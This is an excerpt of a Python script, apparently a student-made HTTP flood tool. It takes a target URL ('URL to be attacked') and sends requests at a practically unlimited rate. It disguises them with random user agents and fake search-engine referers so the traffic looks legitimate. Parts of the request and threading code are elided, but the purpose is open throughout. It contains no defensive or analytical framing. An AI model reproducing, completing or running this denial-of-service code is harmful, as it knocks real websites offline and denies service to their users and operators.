...
# This tool is created by a student
# 
# author : Youcef , version 1.0
# you can contact me on : mkyoucef22@gmail.com
# you can find another project on my github : https://github.com/youceeeef
# ----------------------------------------------------------------------------------------------
import random
import string
import threading
...
headers_referers = []
request_count = 0
request_limit = 999999999999999999999999999999999999999999
flag = 0
safe = 0
...
def generate_referer_list():
    # Generates a referer array
    headers_referers.append('http://www.google.com/?q=' + ''.join(random.choice(string.ascii_lowercase) for i in range(5)))
    headers_referers.append('http://www.yahoo.com/?q=' + ''.join(random.choice(string.ascii_lowercase) for i in range(5)))
    headers_referers.append('http://www.bing.com/?q=' + ''.join(random.choice(string.ascii_lowercase) for i in range(5)))
...
def build_random_ascii_string(length):
    # Builds random ascii string
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def usage():
    # Displays usage message
    print("Usage: python http_flood.py <url> [safe]")
    print("  url : URL to be attacked")
    print("  safe: if present, will use safe-mode (less requests per thread)")
    sys.exit()
...
def http_request(url):
    ...
    data = bytes(build_random_ascii_string(10), 'utf-8')
...
class MonitorThread(threading.Thread):
    ...
    def run(self):
        global request_count, request_limit, flag
        while request_count < request_limit:
            print('Requests sent:', request_count)
            # Wait for 1 second
            time.sleep(1)
        flag = 1
...
if __name__ == '__main__':
    ...
    # Generates user agents and referers
    generate_user_agents()
    generate_referer_list()
